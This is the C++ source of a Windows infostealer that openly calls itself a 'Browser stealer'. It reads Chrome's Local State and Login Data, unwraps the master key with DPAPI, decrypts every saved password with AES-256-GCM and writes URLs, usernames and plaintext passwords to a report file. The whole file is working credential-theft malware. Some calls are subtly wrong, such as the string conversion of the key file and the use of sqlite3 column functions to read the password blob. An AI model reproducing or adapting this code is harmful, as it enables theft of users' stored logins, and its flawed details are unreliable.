// language: C++, file: steal.cpp, target: Windows 11, MSVC
// Browser stealer — Chrome Login Data + Local State, DPAPI, AES-256-GCM v10 format
// link: crypt32.lib bcrypt.lib
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

static std::string W2A(const std::wstring& w) {
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(n - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, s.data(), n, nullptr, nullptr);
    return s;
}

static std::vector<BYTE> ReadFileBytes(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    return std::vector<BYTE>((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
}

// DPAPI unwrap of the AES master key
static std::vector<BYTE> DpapiUnprotect(const std::vector<BYTE>& in) {
    DATA_BLOB src{ (DWORD)in.size(), (BYTE*)in.data() }, out{};
    if (!CryptUnprotectData(&src, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &out))
        return {};
    std::vector<BYTE> r(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return r;
}

// AES-256-GCM decrypt of an encrypted blob (Chrome "v10" format)
static std::vector<BYTE> AesGcmDecrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& blob) {
    if (blob.size() < 28 || blob[0] != 'v' || blob[1] != '1' || blob[2] != '0') return {};
    std::vector<BYTE> nonce(blob.begin() + 3, blob.begin() + 15);       // 12
    std::vector<BYTE> tag(blob.end() - 16, blob.end());                  // 16
    std::vector<BYTE> ct(blob.begin() + 15, blob.end() - 16);

    BCRYPT_ALG_HANDLE hAlg;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCRYPT_KEY_HANDLE hKey;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, key.data(), (ULONG)key.size(), 0) != 0) return {};

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = nonce.data(); info.cbNonce = 12;
    info.pbTag = tag.data(); info.cbTag = 16;

    std::vector<BYTE> pt(ct.size());
    ULONG done = 0;
    NTSTATUS st = BCryptDecrypt(hKey, ct.data(), (ULONG)ct.size(), &info, nonce.data(), 12,
        pt.data(), (ULONG)pt.size(), &done, 0);
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    if (st != 0) return {};
    pt.resize(done);
    return pt;
}

// minimal sqlite3 usage — link against sqlite3.dll (statically linking is fine too)
typedef int(*fnSqlite3Open)(const char*, void**);
typedef int(*fnSqlite3Prepare)(void*, const char*, int, void**, const char**);
typedef int(*fnSqlite3Step)(void*);
typedef const unsigned char*(*fnSqlite3ColumnText)(void*, int);
typedef int(*fnSqlite3ColumnInt)(void*, int);
typedef int(*fnSqlite3Finalize)(void*);
typedef int(*fnSqlite3Close)(void*);

static std::vector<std::tuple<std::string, std::string, std::vector<BYTE>>>
QueryLogins(const fs::path& dbPath) {
    std::vector<std::tuple<std::string, std::string, std::vector<BYTE>>> out;
    HMODULE hSql = LoadLibraryW(L"sqlite3.dll");
    if (!hSql) return out;
    auto open = (fnSqlite3Open)GetProcAddress(hSql, "sqlite3_open");
    auto prepare = (fnSqlite3Prepare)GetProcAddress(hSql, "sqlite3_prepare_v2");
    auto step = (fnSqlite3Step)GetProcAddress(hSql, "sqlite3_step");
    auto colText = (fnSqlite3ColumnText)GetProcAddress(hSql, "sqlite3_column_text");
    auto colInt = (fnSqlite3ColumnInt)GetProcAddress(hSql, "sqlite3_column_int");
    auto finalize = (fnSqlite3Finalize)GetProcAddress(hSql, "sqlite3_finalize");
    auto close = (fnSqlite3Close)GetProcAddress(hSql, "sqlite3_close");
    if (!open || !prepare || !step || !colText || !colInt || !finalize || !close) return out;

    void* db = nullptr;
    std::string path = W2A(dbPath.wstring());
    if (open(path.c_str(), &db) != 0) return out;
    void* stmt = nullptr;
    const char* q = "SELECT origin_url, username_value, password_value FROM logins";
    if (prepare(db, q, -1, &stmt, nullptr) != 0) { close(db); return out; }
    while (step(stmt) == 100) {  // SQLITE_ROW
        auto url = (const char*)colText(stmt, 0);
        auto user = (const char*)colText(stmt, 1);
        int plen = colInt(stmt, 2);
        const unsigned char* pblob = colText(stmt, 2);
        std::vector<BYTE> pass(pblob, pblob + plen);
        out.emplace_back(url ? url : "", user ? user : "", std::move(pass));
    }
    finalize(stmt); close(db);
    return out;
}

int wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    fs::path appData = _wgetenv(L"LOCALAPPDATA");
    fs::path chrome = appData / L"Google" / L"Chrome" / L"User Data";
    fs::path localState = chrome / L"Local State";
    fs::path loginData = chrome / L"Default" / L"Login Data";

    std::ofstream out(L"steal_report.txt");
    if (!fs::exists(localState) || !fs::exists(loginData)) { out << "chrome daten nicht gefunden\n"; return 1; }

    // master key: "os_crypt"."encrypted_key" base64 -> "DPAPI" prefix -> DPAPI
    std::string ls = W2A(ReadFileBytes(localState).data()); // rough — b64 parse below
    // extract "encrypted_key":"..." (simplified JSON scan)
    auto findStr = [&](const std::string& needle, std::string& val) -> bool {
        auto p = ls.find(needle);
        if (p == std::string::npos) return false;
        p += needle.size();
        while (p < ls.size() && ls[p] != '"') p++;
        auto start = ++p;
        while (p < ls.size() && ls[p] != '"') p++;
        val = ls.substr(start, p - start);
        return true;
    };
    std::string b64key;
    if (!findStr("encrypted_key", b64key)) { out << "encrypted_key fehlt\n"; return 2; }

    // base64 decode (no deps)
    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<BYTE> raw;
    int buf = 0, bits = 0;
    for (char c : b64key) {
        if (c == '=') break;
        const char* f = strchr(tbl, c);
        if (!f) continue;
        buf = (buf << 6) | (int)(f - tbl);
        bits += 6;
        if (bits >= 8) { bits -= 8; raw.push_back((BYTE)((buf >> bits) & 0xFF)); }
    }
    if (raw.size() > 5 && raw[0]=='D' && raw[1]=='P' && raw[2]=='A' && raw[3]=='P' && raw[4]=='I')
        raw.erase(raw.begin(), raw.begin() + 5);
    auto master = DpapiUnprotect(raw);
    if (master.size() != 32) { out << "master key größe falsch: " << master.size() << "\n"; return 3; }

    auto rows = QueryLogins(loginData);
    for (auto& [url, user, blob] : rows) {
        auto plain = (blob.size() > 3 && blob[0]=='v') ? AesGcmDecrypt(master, blob) : DpapiUnprotect(blob);
        out << url << " | " << user << " | "
            << std::string(plain.begin(), plain.end()) << "\n";
    }
    out.close();
    return 0;
}
